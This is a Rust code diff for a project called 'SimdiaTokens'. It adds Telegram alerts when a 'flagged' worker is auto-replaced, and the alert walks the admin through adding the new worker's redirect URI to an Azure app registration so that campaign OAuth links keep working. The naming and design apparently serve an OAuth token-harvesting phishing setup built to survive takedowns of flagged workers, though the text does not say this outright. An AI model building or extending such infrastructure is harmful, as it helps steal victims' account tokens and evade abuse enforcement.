@@ -2,6 +2,58 @@ use crate::AppState;
 use sqlx::SqlitePool;
 use std::env;
 
+/// Send a Telegram notification about a worker replacement.
+fn send_worker_alert_telegram(state: &AppState, message: String) {
+    if let (Some(token), Some(chat_id)) = (
+        &state.config.telegram_bot_token,
+        &state.config.telegram_chat_id,
+    ) {
+        let url = format!("https://api.telegram.org/bot{}/sendMessage", token);
+        let chat_id = chat_id.clone();
+        let msg_preview = message.chars().take(80).collect::<String>();
+        tokio::spawn(async move {
+            let params = [
+                ("chat_id", chat_id.as_str()),
+                ("text", message.as_str()),
+                ("parse_mode", "Markdown"),
+            ];
+            let _ = reqwest::Client::new()
+                .post(&url)
+                .form(&params)
+                .send()
+                .await;
+            eprintln!("[worker-health] Telegram alert sent: {}", msg_preview);
+        });
+    }
+}
+
+/// Send both Telegram + email alerts about a worker replacement.
+fn send_worker_alert(state: &AppState, old_worker: &str, new_worker: &str, new_redirect_uri: &str) {
+    let message = format!(
+        "⚠️ *Worker Auto-Replaced*\n\n\
+        *Old worker (flagged):* `{old}`\n\
+        *New worker:* `{new}`\n\n\
+        🔧 *Action required:*\n\
+        Add this redirect URI to Azure Portal:\n\
+        `{uri}`\n\n\
+        Steps:\n\
+        1. Go to Azure Portal -> App registrations\n\
+        2. Find app 8bd2f03a-e0fb-490e-9c02-212c0d96dff4\n\
+        3. Authentication -> Add URI\n\
+        4. Paste the URL above\n\
+        5. Save\n\n\
+        New OAuth links will automatically use the new worker.\n\
+        Old links using /api/campaigns/redirect will also work.\n\
+        Only direct links to the old worker URL are dead.\n\
+        \n_SimdiaTokens Worker Health Monitor_",
+        old = old_worker,
+        new = new_worker,
+        uri = new_redirect_uri,
+    );
+
+    send_worker_alert_telegram(state, message);
+}
+
 /// Create the worker_config table if it doesn't exist.
 /// Stores the active worker name and its health status so that
 /// generate_oauth_link always uses a live worker.
@@ -343,6 +395,10 @@ pub async fn run_worker_health_check(state: &AppState) {
                     // Try to register the new redirect URI in Azure AD
                     // so OAuth flows work with the new worker immediately.
                     let _ = register_redirect_uri_in_azure(state, &new_redirect_uri).await;
+
+                    // Send Telegram + email alert so the admin knows to
+                    // manually add the redirect URI to Azure Portal.
+                    send_worker_alert(state, &worker_name, &new_name, &new_redirect_uri);
 
                     eprintln!(
                         "[worker-health] Active worker updated to {}. \
